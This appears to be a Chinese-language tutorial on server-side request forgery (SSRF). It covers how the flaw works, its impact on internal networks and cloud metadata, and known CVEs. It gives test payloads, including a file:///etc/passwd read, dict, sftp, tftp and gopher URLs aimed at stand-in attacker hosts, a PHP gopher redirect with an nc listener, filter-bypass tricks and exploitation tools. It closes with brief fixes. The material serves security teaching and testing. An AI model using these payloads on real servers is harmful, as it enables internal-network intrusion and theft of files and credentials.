### 简介

SSRF (Server Side Request Forgery) 

### 原理

"隔山打牛"
```
Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> Server2
     /\                           |        /\                        \/ 
     |                           \/        |                          | 
     '----<----【4】resp1----<----'        '---<---【3】resp2----<-----' 
```

攻击者通过控制Requset1中的参数值，发送Requset1到存在SSRF漏洞的Server1，以Server1为"跳板"发出Requset2,通常根据判断Response2的情况(内容、响应时间等),来实现探测内网主机(IP/port/service...)等利用方式


* 造成SSRF的网络环境前提
  * web服务端所在的服务器与其他服务器是网络可达的
* 造成SSRF的直接原因
  * web后端没有对http请求传来的"参数"做过滤与限制
* 存在SSRF漏洞的设计
  * http请求中带有"URL地址"参数值 传给web后端且不经过未严格过滤参数值 就去访问"URL地址"参数值 获取资源(图片.png、图标.ico、网页.html、文本.txt..而攻击者会尝试获取其他资源等方式进行SSRF漏洞利用)
* 造成SSRF的常见场景
  * 资源下载
  * 分享
  * url跳转
  * web在线代理
  * ...

### 漏洞影响

* 内网
  * 探测内网(IP/port/service...)
    * ip 探测内网存活主机
    * service 端口开放情况 如数据库类的服务 （常用判断依据：HTTP响应码、HTTP响应时长）
    * Cloud Instances 如果含有SSRF漏洞的Web应用运行在云实例 可以尝试获取云服务商提供的让内部主机查询自身的元数据
      * AWS(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
      * Google Cloud
  * 攻击内网其他主机
    * 高危漏洞(SQLi、Struts2、Redis未授权、MongoDB未授权...)
  * 读取文件
    * 类型1 支持了URL Schema(file等协议)
      * 实例 `/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml` [21CN某站SSRF(可读取本地数据库配置文件、探测内网)](https://www.secpulse.com/archives/29452.html)
    * 类型2
      * ImageMagick CVE-2016-3718
      * discuz x2.5/x3.0/x3.1/x3.2 SSRF漏洞
      * Ffmpeg文件读取漏洞 CVE-2016-1897  CVE-2016-1898
        * 实例 [新浪微盘存在Ffmpeg文件读取漏洞-SSRF](https://www.secpulse.com/archives/49510.html)
        * 解析 [FFmpeg任意文件读取漏洞分析 - 知乎](https://zhuanlan.zhihu.com/p/28255225)
* 外网
  * 对外发起请求(攻击其他网站等恶意行为)

### 测试方法

* URL Schema
  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
  * `ldap://` 轻量级目录访问协议
    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
  * `gopher://` Gopher是一种分布式文档传递服务
    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
    
### 测试方法 - 以gopher为例

前提：存在SSRF漏洞的web后端所在的服务器必须支持gopher协议，攻击者构造http请求中的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。

先在攻击者公网主机test2.com上监听1337端口，看一会能否收到数据:
```
evil.com:# nc -lvp 1337
```

gopher.php (在攻击者的公网web服务器test1.com上) :
如果有http请求访问 http://test1.com/gopher.php 则httpResponse将会是一个301、302跳转，使用gopher协议对某主机的某端口发送数据。
```
<?php
  header('Location: gopher://test2.com:1337/_Hi%0Assrf');
?>
```

攻击者构造http请求，试图让 存在SSRF漏洞的web后端所在的服务器 去访问 http://test1.com/gopher.php


测试结果，攻击者公网主机test2.com的1337端口，收到了 存在SSRF漏洞的web后端所在的服务器 发来的数据：
```
Hi
ssrf
```

[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`


### 绕过技巧
  * 使用@绕过不严谨的过滤 `a.com@10.10.10.10` `a.com:b@10.10.10.10`
  * IP地址变形 - 进制转换 `127.0.0.1 => 2130706433`
  * 域名解析 `10.100.21.7 => http://10.100.21.7.xip.io 或 http://www.10.100.21.7.xip.name`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
  * 短网址跳转到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
  * JS跳转
  * 以下工具

SSRF测试工具/利用工具

|名称|属性|描述|
|:-------------:|--|-----|
|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
|[samhaxr/XXRF-Shots](https://github.com/samhaxr/XXRF-Shots)|node.js|生成payload 发送众多请求 并使用phantomJS实现网页截图|
|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE...) tool|
|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF实现RCE. This tool generates gopher link for exploiting SSRF and gaining RCE in various servers |

### 修复方式

* 禁用协议 - 仅允许必要的协议 如http和https
* 严格限制参数值(限制)
